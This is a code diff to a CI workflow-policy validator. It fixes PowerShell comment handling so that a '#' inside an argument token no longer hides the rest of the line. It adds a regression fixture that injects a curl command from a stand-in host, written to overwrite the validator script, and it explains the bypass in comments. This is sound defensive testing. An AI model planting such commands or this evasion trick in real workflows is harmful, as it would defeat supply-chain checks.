@@ -827,9 +827,43 @@ function powerShellCodeProjection(text, options) {
       continue;
     }
     if (character === '#') {
-      const start = index;
-      while (index < text.length && text[index] !== '\n') index += 1;
-      emit(start, index, true);
+      // Round 48. PowerShell starts a comment at # only where # begins a token.
+      // In argument mode `marker#text` is a single bare word, so blanking from
+      // any # to the end of the line hid whatever else was on that line.
+      // Measured, with the acquire step's reviewed digest re-baselined:
+      //
+      //   Write-Host marker#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs ...
+      //
+      // was ACCEPTED, while the byte-identical line without the # was rejected
+      // as an executable script path. One character flipped the verdict, and
+      // the network-client, script-path, interpreter and command-position scans
+      // all read this projection, so none of them saw the request.
+      //
+      // Where # begins a token is mode-dependent: checked against PowerShell's
+      // own parser, `$x = 1#c` is a comment in expression mode while
+      // `Write-Host 12#c` is one argument in argument mode, and `,` `&` `-` `:`
+      // continue a bare word while whitespace `;` `)` `}` `|` `(` and a closing
+      // quote end one. Deciding that in general needs a real grammar, which is
+      // a large new place to be wrong -- the same argument this file already
+      // makes against parsing the acquire steps.
+      //
+      // So only the unambiguous cases are treated as comments: start of text,
+      // or after whitespace. That covers every comment in both workflows --
+      // verified, neither file contains a # preceded by anything else -- and
+      // everything else stays code. This is the safe direction. Mistaking a
+      // comment for code can only cause a false rejection, which is loud and
+      // gets fixed; mistaking code for a comment hides an executable suffix,
+      // which is silent and is exactly what was reported.
+      const previous = index === 0 ? '' : text[index - 1];
+      if (previous === '' || previous === ' ' || previous === '\t' ||
+          previous === '\n' || previous === '\r') {
+        const start = index;
+        while (index < text.length && text[index] !== '\n') index += 1;
+        emit(start, index, true);
+        continue;
+      }
+      characters.push(character);
+      index += 1;
       continue;
     }
     if (character === "'" || character === '"') {
@@ -2615,6 +2649,11 @@ const FIXTURE_INVENTORY = Object.freeze([
   // command at command position and the allowlist catches it first, correctly.
   // This is the form that names nothing there, which is what this rule is for.
   ['T1-MARKDOWN-086', 'command string executed through a script block in the lint job', 'markdown', (source) => replaceLast(source, '          $boolCiExisted = Test-Path Env:CI\n', "          [scriptblock]::Create('npm run lint:' + 'md').Invoke()\n          $boolCiExisted = Test-Path Env:CI\n")],
+  // Round 48. The hash sits inside an argument token, so PowerShell does not
+  // start a comment there and the curl after the semicolon runs. Before the
+  // projection was corrected this whole suffix was blanked and the step was
+  // accepted; the same line without the # was already rejected.
+  ['T1-MARKDOWN-087', 'request hidden behind a hash inside an argument token', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          Write-Host marker#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
   ['T1-MARKDOWN-072', 'supply prelude closed twice, shortening the compared region', 'markdown', (source) => replaceOnce(source, "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n", "          $strGlobalConfigDirectory = [System.IO.Path]::GetDirectoryName($env:npm_config_globalconfig)\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n          if ($strGlobalConfigDirectory -cne '/etc') {\n              throw 'supply: the neutralized global npm configuration is not under a root-owned directory'\n          }\n")],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -2857,6 +2896,7 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-084": "markdown-policy: markdown.markdownlint.lint assigns an unreviewed environment variable: NODE_OPTIONS",
   "T1-MARKDOWN-085": "markdown-policy: markdown.policy.validate adds a dynamic or indirect execution path",
   "T1-MARKDOWN-086": "markdown-policy: markdown.markdownlint.lint adds a dynamic or indirect execution path",
+  "T1-MARKDOWN-087": "acquire-policy: markdown.policy.acquire references an executable script path",
   "T1-MARKDOWN-023": "markdown-policy: markdown.markdownlint.lint contains a workflow expression",
   "T1-MARKDOWN-022": "policy: markdown.markdownlint job permissions differs from the locked policy",
   "T1-LINTASSET-001": "supply-policy: .markdownlint.jsonc does not match its reviewed digest",
